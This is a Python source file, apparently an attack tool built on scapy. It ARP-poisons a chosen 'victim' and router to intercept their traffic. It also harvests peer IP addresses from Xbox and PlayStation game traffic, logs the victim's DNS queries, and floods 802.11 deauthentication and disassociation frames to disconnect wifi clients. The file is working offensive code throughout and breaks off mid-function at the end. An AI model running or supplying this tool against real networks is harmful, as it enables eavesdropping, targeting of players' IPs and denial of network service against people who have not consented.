import sys
import os
import time
from datetime import datetime
import argparse
from multiprocessing import Process
import logging
from random import randint
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
	from scapy.all import *
except ImportError:
	print('You do not have scapy installed')
	sys.exit()
conf.verb = 0 
import signal
import threading

os.system("clear")

W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

def pullipsChoice():
	OutList = []
	exc = []
	ports = []
	pot = ''
	print('1 - Filter Xbox ports')
	print('2 - Filter PlayStation ports')
	print('3 - Create list of ports to filter')
	print('4 - Don\'t filter ports\n')
	option = raw_input('filter> ')
	if str(option) == '1':
		ports = [53, 80, 88, 443, 3074, 3075, 500, 3544, 4500]
	elif str(option) == '2':
		ports = [80, 443, 5223, 3478, 3479, 3658, 3074, 3075, 3649, 3660, 1935, 3480, 465, 983, 10071, 10080]
	elif str(option) == '3':
		while str(pot) != 'done':
			try:
				pot = raw_input('[!] Add a port to the list of filter ports(\'done\' when finished): ')
				if str(pot) == 'done':
					break
				elif int(pot) >= 1 and int(pot) <= 65535:
					ports.append(int(pot))
				else:
					print('[!] That is not a filterable port')
			except:
				print('[!] That is not a filterable port')
	elif str(option) == '4':
		for i in range(1, 65535):
			ports.append(int(i))
	print('\n[!] List of filter ports:')
	if str(option) != '4':
		for pot in ports:
			print(pot)
	else:
		print('All')

	try:
		interface = raw_input('[!] Enter your sniffing Interface: ')
		targetIP = raw_input('[!] Enter Victim IP: ')
		gateIP = raw_input('[!] Enter Router IP: ')
		monIP = targetIP
		print('\n\n\n')
	except KeyboardInterrupt:
		print ('[!] Exiting...')
		
		sys.exit(1)
	print('[!] Using interface: ' + str(interface))
	print('[!] Using gateway address: ' + str(gateIP))
	print('[!] Using target address: ' + str(targetIP))
	print ('[!] Enabling address forwarding...')
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	def get_mac(IP):
		conf.verb = 0
		ans, unans = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
		for snd,rcv in ans:
			return rcv.sprintf(r'%Ether.src%')
	def restore():
		print ('\n[!] Restoring original ARP caches...')
		victimMAC = get_mac(targetIP)
		gateMAC = get_mac(gateIP)
		send(ARP(op = 2, pdst = gateIP, psrc = targetIP, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = victimMAC), count = 7)
		send(ARP(op = 2, pdst = targetIP, psrc = gateIP, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateMAC), count = 7)
		print ('[!] Disabling address forwarding...')
		os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
		print ('[!] Exiting...')
		sys.exit(1)
	def trick(gm, vm):
		send(ARP(op = 2, pdst = targetIP, psrc = gateIP, hwdst= vm))
		send(ARP(op = 2, pdst = gateIP, psrc = targetIP, hwdst= gm))
	
	def querysniff(pkt):
		if IP in pkt:
			app=True
			ip_src = pkt[IP].src
			ip_dst = pkt[IP].dst	
	#		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
	#		print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
			try:
				if (str(monIP) in str(ip_src) or str(monIP) in str(ip_dst)) and (int(pkt[IP].sport) in ports):
					if str(ip_src) != str(monIP):
						count=OutList.count(str(ip_src) + ':' + str(pkt[IP].sport))
						if monIP not in ip_src:
							for item in OutList:
								count, ip, port = item.split(':')
								if ip_src == ip and str(pkt[IP].sport) == str(port):
									count = int(count)
									count = count + 1
									OutList.remove(item)
									entry=str(count) + ':' + str(ip) + ':' + str(port)
									OutList.append(entry)
									app=False
									break
							if app == True:
								appn='1:' + str(ip_src) + ':' + str(pkt[IP].sport)
								OutList.append(appn)
					elif str(ip_dst) != str(monIP):
						count=OutList.count(str(ip_dst) + ':' + str(pkt[IP].sport))
						if monIP not in ip_dst:
							for item in OutList:
								count, ip, port = item.split(':')
								if ip_dst == ip and str(pkt[IP].sport) == str(port):
									count = int(count)
									count = count + 1
									OutList.remove(item)
									entry=str(count) + ':' + str(ip) + ':' + str(port)
									OutList.append(entry)
									app=False
									break
							if app == True:
								appn='1:' + str(ip_dst) + ':' + str(pkt[IP].sport)
								OutList.append(appn)
				elif (str(monIP) in str(ip_src) or str(monIP) in str(ip_dst)) and (int(pkt[IP].dport) in ports):
					if str(ip_src) != str(monIP):
						count=OutList.count(str(ip_src) + ':' + str(pkt[IP].dport))
						if monIP not in ip_src:
							for item in OutList:
								count, ip, port = item.split(':')
								if ip_src == ip and str(pkt[IP].dport) == str(port):
									count = int(count)
									count = count + 1
									OutList.remove(item)
									entry=str(count) + ':' + str(ip) + ':' + str(port)
									OutList.append(entry)
									app=False
									break
							if app == True:
								appn='1:' + str(ip_src) + ':' + str(pkt[IP].dport)
								OutList.append(appn)
					elif str(ip_dst) != str(monIP):
						count=OutList.count(str(ip_dst) + ':' + str(pkt[IP].dport))
						if monIP not in ip_dst:
							for item in OutList:
								count, ip, port = item.split(':')
								if ip_dst == ip and str(pkt[IP].dport) == str(port):
									count = int(count)
									count = count + 1
									OutList.remove(item)
									entry=str(count) + ':' + str(ip) + ':' + str(port)
									OutList.append(entry)
									app=False
									break
							if app == True:
								appn='1:' + str(ip_dst) + ':' + str(pkt[IP].dport)
								OutList.append(appn)
				os.system('clear')
				output = []
				modifier = 23
				if str(option) != '4':
					print('\nPulling IPs\n\nFilter ports: ' + str(ports) + '\n\n[!] IP Monitor: ' + str(monIP) + '\n\n')
				else:
					print('\nPulling IPs\n\nFilter ports: ' + str(len(ports)) + '\n\n[!] IP Monitor: ' + str(monIP) + '\n\n')
				print('Pkt Count	IP Address             Port\n')
				for i in OutList:
					if i not in output:
						output.append(i)
						count, ip, port = i.split(':')
						mod = modifier - (len(ip))
						space1 = ' ' * 8
						space2 = ' ' * mod
						print(str(count) + '		' + str(ip) + str(space2) + str(port))
				print('\n\n')
				for e in exc:
					print(e)
			except:
				e = '[!] PACKET EXCEPTION: ' + str(ip_src) + ' -> ' + str(ip_dst)
				if e not in exc:
					exc.append('[!] PACKET EXCEPTION: ' + str(ip_src) + ' -> ' + str(ip_dst))
	
	def sniffer():
		print('[!] Started sniffer')
		try:
			sniff(iface = interface, prn = querysniff, store = 0)
		except KeyboardInterrupt:
			print ('[!] Stopping sniffer thread')
			sys.exit()
	
	def mitm():
		print('[!] Starting sniffing thread')
		thread = threading.Thread(target=sniffer)
		thread.daemon=True
		try:
			thread.start()
		except KeyboardInterrupt:
			print('[!] Stopping sniffer thread')
		try:
			victimMAC = get_mac(targetIP)
		except Exception:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			print ('[!] Couldn\'t resolve target MAC address')
			print ('[!] Exiting...')
			sys.exit(1)
		try:
			gateMAC = get_mac(gateIP)
		except Exception:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			print ('[!] Couldn\'t resolve gateway MAC address')
			print ('[!] Exiting...')
			sys.exit(1)
		print ('[!] Stop with Ctrl+C | Poisoning ARP caches...')
		while 1:
			try:
				trick(gateMAC, victimMAC)
				time.sleep(1.5)
			except KeyboardInterrupt:
				restore()
				break
	
	mitm()

def poisonChoice():
	try:
		interface = raw_input('[!] Enter Desired Interface: ')
		targetIP = raw_input('[!] Enter Victim IP: ')
		gateIP = raw_input('[!] Enter Router IP: ')
		print('\n\n\n')
	except KeyboardInterrupt:
		print ('[!] Exiting...')
		
		sys.exit(1)
	print('[!] Using interface: ' + str(interface))
	print('[!] Using gateway address: ' + str(gateIP))
	print('[!] Using target address: ' + str(targetIP))
	print ('[!] Enabling address forwarding...')
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	def get_mac(IP):
		conf.verb = 0
		ans, unans = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
		for snd,rcv in ans:
			return rcv.sprintf(r'%Ether.src%')
	def restore():
		print ('\n[!] Restoring original ARP caches...')
		victimMAC = get_mac(targetIP)
		gateMAC = get_mac(gateIP)
		send(ARP(op = 2, pdst = gateIP, psrc = targetIP, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = victimMAC), count = 7)
		send(ARP(op = 2, pdst = targetIP, psrc = gateIP, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateMAC), count = 7)
		print ('[!] Disabling address forwarding...')
		os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
		print ('[!] Exiting...')
		sys.exit(1)
	def trick(gm, vm):
		send(ARP(op = 2, pdst = targetIP, psrc = gateIP, hwdst= vm))
		send(ARP(op = 2, pdst = gateIP, psrc = targetIP, hwdst= gm))
	def mitm():
		try:
			victimMAC = get_mac(targetIP)
		except Exception:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			print ('[!] Couldn\'t resolve target MAC address')
			print ('[!] Exiting...')
			sys.exit(1)
		try:
			gateMAC = get_mac(gateIP)
		except Exception:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			print ('[!] Couldn\'t resolve gateway MAC address')
			print ('[!] Exiting...')
			sys.exit(1)
		print ('[!] Stop with Ctrl+C | Poisoning ARP caches...')
		while 1:
			try:
				trick(gateMAC, victimMAC)
				time.sleep(1.5)
			except KeyboardInterrupt:
				restore()
				break
	mitm()	

def dnssniffChoice():
	try:
		interface = raw_input('[!] Enter your sniffing Interface: ')
		targetIP = raw_input('[!] Enter Victim IP: ')
		gateIP = raw_input('[!] Enter Router IP: ')
		monIP = targetIP
		print('\n\n\n')
	except KeyboardInterrupt:
		print ('[!] Exiting...')
		
		sys.exit(1)
	print('[!] Using interface: ' + str(interface))
	print('[!] Using gateway address: ' + str(gateIP))
	print('[!] Using target address: ' + str(targetIP))
	print ('[!] Enabling address forwarding...')
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	def get_mac(IP):
		conf.verb = 0
		ans, unans = srp(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
		for snd,rcv in ans:
			return rcv.sprintf(r'%Ether.src%')
	def restore():
		print ('\n[!] Restoring original ARP caches...')
		victimMAC = get_mac(targetIP)
		gateMAC = get_mac(gateIP)
		send(ARP(op = 2, pdst = gateIP, psrc = targetIP, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = victimMAC), count = 7)
		send(ARP(op = 2, pdst = targetIP, psrc = gateIP, hwdst = 'ff:ff:ff:ff:ff:ff', hwsrc = gateMAC), count = 7)
		print ('[!] Disabling address forwarding...')
		os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
		print ('[!] Exiting...')
		sys.exit(1)
	def trick(gm, vm):
		send(ARP(op = 2, pdst = targetIP, psrc = gateIP, hwdst= vm))
		send(ARP(op = 2, pdst = gateIP, psrc = targetIP, hwdst= gm))
	def querysniff(pkt):
		if IP in pkt:
			ip_src = pkt[IP].src
			ip_dst = pkt[IP].dst	
			if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
				print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
	def sniffer():
		try:
			sniff(iface = interface,filter = "port 53", prn = querysniff, store = 0)
		except KeyboardInterrupt:
			sys.exit()
	def mitm():
		print('[!] Starting sniffing thread')
		thread = threading.Thread(target=sniffer)
		thread.daemon=True
		try:
			thread.start()
		except KeyboardInterrupt:
			print('[!] Stopping sniffer thread')
		try:
			victimMAC = get_mac(targetIP)
		except Exception:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			print ('[!] Couldn\'t resolve target MAC address')
			print ('[!] Exiting...')
			sys.exit(1)
		try:
			gateMAC = get_mac(gateIP)
		except Exception:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
			print ('[!] Couldn\'t resolve gateway MAC address')
			print ('[!] Exiting...')
			sys.exit(1)
		print ('[!] Stop with Ctrl+C | Poisoning ARP caches...')
		while 1:
			try:
				trick(gateMAC, victimMAC)
				time.sleep(1.5)
			except KeyboardInterrupt:
				restore()
				break
	
	mitm()

def APclisniffChoice(type):
	subs=(0, 2, 4)
	subs2=(0, 2, 4, 5)
	acpacket_list=[]
	naclpacket_list=[]
	onepackets_list=[]
	twopackets_list=[]
	sixpackets_list=[]
	probresp=[]
	reqsend=[]
	action=[]
	misc1=[]
	misc2=[]
	d_list1=[]
	d_list2=[]
	ass_list=[]
	parser = argparse.ArgumentParser(description='COMMotS wifi tool')
	parser.add_argument('-a', '--accesspoint', dest='ap', type=str, required=False, help='Target access point BSSID')
	parser.add_argument('-w', '--client', dest='client', type=str, required=False, help='Specific client MAC to attack(0 = ALL)')
	parser.add_argument('-t', '--time', dest='limit', type=int, required=False, help='Number of packets to send(default = infinite)')
	parser.add_argument('-c', '--channel', dest='channel', type=int, required=False, help='Channel of target access point')
	parser.add_argument('-f', '--interval', dest='frequency', type=float, required=False, help='Interval between packets(default = 0.1)')
	parser.add_argument('-i', '--interface', dest='interface', type=str, required=False, help='Attacking/Scanning interface')
	parser.add_argument('-s', '--sniffer', dest='sniffer', type=str, required=False, help='t = Activate sniffer only')
	parser.add_argument('-m', '--menu', dest='menu', type=str, required=False, help='t = Interactive menu')
	parser.add_argument('-d', '--deauth', dest='deauth', type=str, required=False, help='de/di = deauth/disassociation packets to speed up scanning')
	args = parser.parse_args()
	if str(type) == 'sniff':
		args.sniffer = 't'
		ch = raw_input('[!] Enter specific channel or skip to use all channels: ')
		if ch != '':
			print('[!] Using channel: ' + str(ch))
			args.channel = int(ch)
		else:
			print('[!] Using all channels')
		ap = raw_input('[!] Enter BSSID of AP to filter for or skip to find all: ')
		if str(ap) != '':
			print('[!] Filtering for: ' + str(ap))
			args.ap = str(ap)
		else:
			print('[!] Sniffing for all APs')
		fa = ''
		while str(fa) == '':
			fa = raw_input('[!] Enter the interface to use to sniff: ')
		args.interface = str(fa)
		os.system('ifconfig ' + str(fa) + ' down')
		os.system('iwconfig ' + str(fa) + ' mode monitor')
		os.system('ifconfig ' + str(fa) + ' up')
		print('[!] Placed ' + str(fa) + ' in monitor mode')
	elif str(type) == 'attack':
		print('1 - Scan for targets then attack')
		print('2 - Setup attack\n')
		ty = raw_input('attack> ')
		if str(ty) == '1':
			args.menu = 't'
			ch = raw_input('[!] Enter specific channel or skip to use all channels: ')
			if ch != '':
				print('[!] Using channel: ' + str(ch))
				args.channel = int(ch)
			else:
				print('[!] Using all channels')
			ap = raw_input('[!] Enter BSSID of AP to filter for or skip to find all: ')
			if str(ap) != '':
				print('[!] Filtering for: ' + str(ap))
				args.ap = str(ap)
			else:
				print('[!] Sniffing for all APs')
			fa = ''
			while str(fa) == '':
				fa = raw_input('[!] Enter the interface to use to sniff: ')
			args.interface = str(fa)
			args.interface = str(fa)
			os.system('ifconfig ' + str(fa) + ' down')
			os.system('iwconfig ' + str(fa) + ' mode monitor')
			os.system('ifconfig ' + str(fa) + ' up')
			print('[!] Placed ' + str(fa) + ' in monitor mode')
		elif str(ty) == '2':
			ch = ''
			while str(ch) == '':
				ch = raw_input('[!] Enter the channel of the Access point: ')
				args.channel = int(ch)
			ap = ''
			while str(ap) == '':
				ap = raw_input('[!] Enter the BSSID of the Access point: ')
				args.ap = str(ap)
			cl = ''
			while str(cl) == '':
				cl = raw_input('[!] Enter the MAC address of the target client(FF:FF:FF:FF:FF:FF = ALL): ')
				args.client = str(cl)
			fr = ''
			while str(fr) == '':
				fr = raw_input('[!] Enter the frequency of outgoing packets(0.1 advised): ')
				args.frequency = float(fr)
			li = ''
			while str(li) == '':
				li = raw_input('[!] Enter the amount of packets to send(-1 = infinite): ')
				args.limit = int(li)
				if str(li) == '-1':
					am = 'infinite'
				else:
					am = str(li)
			fa = ''
			while str(fa) == '':
				fa = raw_input('[!] Enter which interface to use: ')
				args.interface = str(fa)
			args.interface = str(fa)
			os.system('ifconfig ' + str(fa) + ' down')
			os.system('iwconfig ' + str(fa) + ' mode monitor')
			os.system('ifconfig ' + str(fa) + ' up')
			print('[!] Placed ' + str(fa) + ' in monitor mode')
			print('Parameters:\n')
			print('  Channel: ' + str(ch))
			print('    BSSID: ' + str(ap))
			print('   Client: ' + str(cl))
			print('Frequency: ' + str(fr))
			print('   Amount: ' + str(am))
			print('Interface: ' + str(fa) + '\n')
			go = raw_input('Press enter to begin...')
	if args.ap:
		acc=args.ap
		accb=True
	else:
		#print"Blank AP"
		acc="0"
		accb=False
	
	if args.client:
		cli=args.client
		clib=True
	else:
		#print"Blank client"
		cli="0"
		clib=False
	
	if args.limit:
		tim=args.limit
		timb=True
	else:
		#print"Blank limit"
		tim=-1
		timb=False
	
	if args.channel:
		cha=args.channel
		chab=True
	else:
		#print"Blank channel"
		chab=False
	
	if args.frequency:
		fre=args.frequency
		freb=True
	else:
		#print"Blank frequency"
		fre=0.1
		freb=False
	
	if args.interface:
		fac=args.interface
		facb=True
	else:
		#print"Blank interface"
		facb=False
	
	if args.sniffer:
		sni=args.sniffer
		snib=True
	else:
		snib=False
	
	if args.menu:
		men=args.menu
		menb=True
	else:
		menb=False
	
	if args.deauth:
		dea=args.deauth
		deab=True
	else:
		deab=False
	def instigate(bssid):
		count=0
		if timb == True:
			limit=tim
		else:
			limit=5
		while count <= limit:
			if args.deauth == "de":
				pack = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
			elif args.deauth == "di":
				pack = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Disas()
			else:
				print "no args"
				return
			sendp(pack, iface=fac, inter=0.0001)
			count=count+1
	
	def noise_filter(addr1, addr2):
		# Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
		ignore = ['00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
		for i in ignore:
			if i in addr1 or i in addr2:
				#print '['+T+'*'+W+']' + addr1 + ' ' + addr2
				pint=False
				return True
			if accb == True:
				if addr1 != acc and addr2 != acc:
					pint=False
					return True
	
	def channel_hopper(interface):
		channel=1
		while True:
			while channel < 15:
				try:
					os.system("iwconfig %s channel %d" % (interface, channel))
					#print channel
					channel=channel+1
					time.sleep(1)
					if channel == 15:
						channel=1
				except KeyboardInterrupt:
					print ""
					print '['+T+'*'+W+'] Terminating sniffer'
					break
	
	def PacketHandler(pkt):
		ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
		pint=False
		if pkt.haslayer(Dot11):
			if pkt.addr1 and pkt.addr2:
				if noise_filter(pkt.addr1, pkt.addr2):
	                		return
			if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
				if pkt.addr2 not in ap_list:
					ap_list.append(pkt.addr2)
					chan = int(ord(pkt[Dot11Elt:3].info))
					acpacket_list.append(pkt)
					pint=True
					if args.deauth:
						instigate(pkt.addr2)
					#if chan < 10:
					#	print "  Access Point    BSSID: %s    CH#: %s     ESSID: %s" %(pkt.addr2, chan, pkt.info)
					#if chan >= 10:
					#	print "  Access Point    BSSID: %s    CH#: %s    ESSID: %s" %(pkt.addr2, chan, pkt.info)
			if pkt.type in [1] and pkt.subtype != 13 and pkt.subtype != 11 :
				if pkt.subtype == 9:
					bssid      = pkt[Dot11].addr1
					bssid2 = pkt[Dot11].addr2
				elif pkt.subtype == 8:
					bssid2     = pkt[Dot11].addr1
					bssid = pkt[Dot11].addr2
				else:
					bssid2     = pkt[Dot11].addr1
					bssid = pkt[Dot11].addr2
				#for i in ignore:
	        		#	if i in pkt.addr1 or i in pkt.addr2:
	            		#		proc=False
				#	else:
				#		proc=True
				#if proc == True:
				if bssid2 not in client_list:
					if bssid not in ignore:
						if bssid2 not in ignore:
							if bssid not in ap_list:
								try:
									pint=True
									client_list.append(bssid2)
									if bssid2 not in client_list:
										onepackets_list.append(pkt)
									#if bssid not in naclient_list:
									#	print ''+T+'        Client'+W+'      MAC: ' + bssid + '               BSSID: ' + bssid2 + ''+C+'  Type 1'+W+'  '
									#else:
									#	print ''+T+'        Client'+W+'      MAC: ' + bssid + '               BSSID: ' + bssid2 + ''+C+'  Type 1'+W+''+G+' Now Associated'+W+'  '
								except TypeError:
									#print '['+R+'!'+W+'] TyperError'
									pants=True
			elif pkt.type in [2]:
				if pkt.subtype == 4:
					bssid      = pkt[Dot11].addr2
					bssid2 = pkt[Dot11].addr1
				else:
					bssid      = pkt[Dot11].addr1
					bssid2 = pkt[Dot11].addr2
				if bssid not in client_list:
					if bssid not in ignore:
						if bssid2 not in ignore:
							if bssid not in ap_list:
								if bssid2 not in client_list:
									try:
										pint=True
										if pkt.subtype == 4:
											sixpackets_list.append(pkt)
											client_list.append(bssid)
											#if bssid not in naclient_list:
											#	print ''+T+'        Client'+W+'      MAC: ' + bssid + '               BSSID: ' + bssid2 + ''+C+'  Type 2 Subtype 4'+W+'  '
											#else:
											#	print ''+T+'        Client'+W+'      MAC: ' + bssid + '               BSSID: ' + bssid2 + ''+C+'  Type 2 Subtype 4'+W+''+G+' Now Associated'+W+'  '
										else:
											twopackets_list.append(pkt)
											client_list.append(bssid)
											#if bssid not in naclient_list:
											#	print ''+T+'        Client'+W+'      MAC: ' + bssid + '               BSSID: ' + bssid2 + ''+C+'  Type 2'+W+'  '
											#else:
											#	print ''+T+'        Client'+W+'      MAC: ' + bssid + '               BSSID: ' + bssid2 + ''+C+'  Type 2'+W+''+G+' Now Associated'+W+'  '
											
									except TypeError:
										#print '['+R+'!'+W+'] TyperError'
										pants=True
			if pkt.type == 0 and pkt.subtype in subs:
				if pkt.addr2 not in naclient_list:
					if pkt.addr2 not in client_list:
						pint=True
						#print ''+T+'        Client'+W+'      MAC: ' + pkt.addr2 + ''+R+'                      Not Associated'+W+''
						naclient_list.append(pkt.addr2)
						naclpacket_list.append(pkt)
			#if pkt.haslayer(Dot11ProbeResp):
			#	if pkt.addr1 not in client_list:
			#		pint=True
			#		client_list.append(pkt.addr1)
			#		probresp.append(pkt)
			if pkt.type == 1 and pkt.subtype == 11:
				if pkt.addr1 in ap_list:
					if pkt.addr2 not in client_list:
						client_list.append(pkt.addr2)
						reqsend.append(pkt)
				elif pkt.addr2 in ap_list:
					if pkt.addr1 not in client_list:
						client_list.append(pkt.addr1)
						reqsend.append(pkt)
			if pkt.type == 0 and pkt.subtype == 13:
				if pkt.addr1 in ap_list:
					if pkt.addr2 not in client_list:
						client_list.append(pkt.addr2)
						action.append(pkt)
				elif pkt.addr2 in ap_list:
					if pkt.addr1 not in client_list:
						client_list.append(pkt.addr1)
						action.append(pkt)
			if pkt.type == 0 and pkt.subtype == 11:
				if pkt.addr1 in ap_list:
					if pkt.addr2 not in client_list:
						d_list2.append(pkt)
						client_list.append(pkt.addr2)
				elif pkt.addr2 in ap_list:
					if pkt.addr1 not in client_list:
						d_list1.append(pkt)
						client_list.append(pkt.addr1)
			if pkt.type == 0 and pkt.subtype == 0:
				if pkt.addr2 not in client_list:
					ass_list.append(pkt)
					client_list.append(pkt.addr2)
			if pkt.addr1 and pkt.addr2:
				if pkt.addr1 != "ff:ff:ff:ff:ff:ff" and pkt.addr2 != "ff:ff:ff:ff:ff:ff":
					if pkt.type != 0 and pkt.subtype not in subs2:
						if pkt.addr1 in ap_list:
							if pkt.addr2 not in client_list:
								misc2.append(pkt)
								client_list.append(pkt.addr2)
						elif pkt.addr2 in ap_list:
							if pkt.addr1 not in client_list:
								misc1.append(pkt)
								client_list.append(pkt.addr1)
		if pint == True:
			os.system("clear")
			print '['+T+'*'+W+'] Press Ctrl+C to stop sniffer'
			print ""
			if args.deauth == "t":
				print '['+R+'!'+W+']'+P+' Using data instigator'+W+''
			print'''
*********************************************************************************************
Access Points
*********************************************************************************************'''
			for access in acpacket_list:
				chan = int(ord(access[Dot11Elt:3].info))
				if chan < 10:
					print "  Access Point    BSSID: %s    CH#: %s     ESSID: %s" %(access.addr2, chan, access.info)
				if chan >= 10:
					print "  Access Point    BSSID: %s    CH#: %s    ESSID: %s" %(access.addr2, chan, access.info)
			print'''
*********************************************************************************************
Clients
*********************************************************************************************'''
			for nacl in naclpacket_list:
				if nacl.addr2 not in client_list:
					if nacl.addr2 in naclient_list:
						print ''+T+'        Client'+W+'      MAC: ' + nacl.addr2 + ''+R+'                      Not Associated'+W+''
			for ass in ass_list:
				if ass.addr2 not in naclient_list:
					print ''+T+'        Client'+W+'      MAC: ' + ass.addr2 + '               BSSID: ' + ass.addr1 + ''+C+'  Instigated 0'+W+'  '
				else:
					naclient_list.remove(ass.addr2)
					print ''+T+'        Client'+W+'      MAC: ' + ass.addr2 + '               BSSID: ' + ass.addr1 + ''+C+'  Instigated 0'+W+''+G+' Now Associated'+W+'  '
			for dlist in d_list1:
				if dlist.addr1 not in naclient_list:
					print ''+T+'        Client'+W+'      MAC: ' + dlist.addr1 + '               BSSID: ' + dlist.addr2 + ''+C+'  Instigated 1'+W+'  '
				else:
					naclient_list.remove(dlist.addr1)
					print ''+T+'        Client'+W+'      MAC: ' + dlist.addr1 + '               BSSID: ' + dlist.addr2 + ''+C+'  Instigated 1'+W+''+G+' Now Associated'+W+'  '
			for dlist in d_list2:
				if dlist.addr2 not in naclient_list:
					print ''+T+'        Client'+W+'      MAC: ' + dlist.addr2 + '               BSSID: ' + dlist.addr1 + ''+P+'  Instigated 2'+W+'  '
				else:
					naclient_list.remove(dlist.addr2)
					print ''+T+'        Client'+W+'      MAC: ' + dlist.addr2 + '               BSSID: ' + dlist.addr1 + ''+P+'  Instigated 2'+W+''+G+' Now Associated'+W+'  '
			for misc in misc1:
				if misc.addr1 not in naclient_list:
					print ''+T+'        Client'+W+'      MAC: ' + misc.addr1 + '               BSSID: ' + misc.addr2 + ''+C+'  Misc 1'+W+'  '
				else:
					naclient_list.remove(misc.addr1)
					print ''+T+'        Client'+W+'      MAC: ' + misc.addr1 + '               BSSID: ' + misc.addr2 + ''+C+'  Misc 1'+W+''+G+' Now Associated'+W+'  '
			for mics in misc2:
				if mics.addr2 not in naclient_list:
					print ''+T+'        Client'+W+'      MAC: ' + mics.addr2 + '               BSSID: ' + mics.addr1 + ''+C+'  Misc 2'+W+'  '
				else:
					naclient_list.remove(mics.addr2)
					print ''+T+'        Client'+W+'      MAC: ' + mics.addr2 + '               BSSID: ' + mics.addr1 + ''+C+'  Misc 2'+W+''+G+' Now Associated'+W+'  '
			#for resp in probresp:
			#	if resp.addr1 not in naclient_list:
			#		print ''+T+'        Client'+W+'      MAC: ' + resp.addr1 + '               BSSID: ' + resp.addr2 + ''+C+'  Type 0 Subtype 5'+W+'  '
			#	else:
			#		naclient_list.remove(resp.addr1)
			#		print ''+T+'        Client'+W+'      MAC: ' + resp.addr1 + '               BSSID: ' + resp.addr2 + ''+C+'  Type 0 Subtype 5'+W+''+G+' Now Associated'+W+'  '
			for req in reqsend:
				if req.addr1 in ap_list:
					if req.addr2 not in naclient_list:
						print ''+T+'        Client'+W+'      MAC: ' + req.addr2 + '               BSSID: ' + req.addr1 + ''+C+'  Type 1 Subtype 11'+W+'  '
					else:
						naclient_list.remove(req.addr2)
						print ''+T+'        Client'+W+'      MAC: ' + req.addr2 + '               BSSID: ' + req.addr1 + ''+C+'  Type 1 Subtype 11'+W+''+G+' Now Associated'+W+'  '
				elif req.addr2 in ap_list:
					if req.addr1 not in naclient_list:
						print ''+T+'        Client'+W+'      MAC: ' + req.addr1 + '               BSSID: ' + req.addr2 + ''+C+'  Type 1 Subtype 11'+W+'  '
					else:
						naclient_list.remove(req.addr1)
						print ''+T+'        Client'+W+'      MAC: ' + req.addr1 + '               BSSID: ' + req.addr2 + ''+C+'  Type 1 Subtype 11'+W+''+G+' Now Associated'+W+'  '
			for act in action:
				if act.addr1 in ap_list:
					if act.addr2 not in naclient_list:
						print ''+T+'        Client'+W+'      MAC: ' + act.addr2 + '               BSSID: ' + act.addr1 + ''+C+'  Type 0 Subtype 13'+W+'  '
					else:
						naclient_list.remove(act.addr2)
						print ''+T+'        Client'+W+'      MAC: ' + act.addr2 + '               BSSID: ' + act.addr1 + ''+C+'  Type 0 Subtype 13'+W+''+G+' Now Associated'+W+'  '
				elif act.addr2 in ap_list:
					if act.addr1 not in naclient_list:
						print ''+T+'        Client'+W+'      MAC: ' + act.addr1 + '               BSSID: ' + act.addr2 + ''+C+'  Type 0 Subtype 13'+W+'  '
					else:
						naclient_list.remove(act.addr1)
						print ''+T+'        Client'+W+'      MAC: ' + act.addr1 + '               BSSID: ' + act.addr2 + ''+C+'  Type 0 Subtype 13'+W+''+G+' Now Associated'+W+'  '
			for ones in onepackets_list:
				try:
					if ones.subtype == 9:
						if ones.addr1 not in ap_list:
							if ones.addr1 not in naclient_list:
								print ''+T+'        Client'+W+'      MAC: ' + ones.addr1 + '               BSSID: ' + ones.addr2 + ''+C+'  Type 1 Subtype 9'+W+'  '
							else:
								naclient_list.remove(ones.addr1)
								print ''+T+'        Client'+W+'      MAC: ' + ones.addr1 + '               BSSID: ' + ones.addr2 + ''+C+'  Type 1 Subtype 9'+W+''+G+' Now Associated'+W+'  '
					else:
						if ones.addr2 not in ap_list:
							if ones.addr2 not in naclient_list:
								print ''+T+'        Client'+W+'      MAC: ' + ones.addr2 + '               BSSID: ' + ones.addr1 + ''+C+'  Type 1 Subtype 9'+W+'  '
							else:
								naclient_list.remove(ones.addr2)
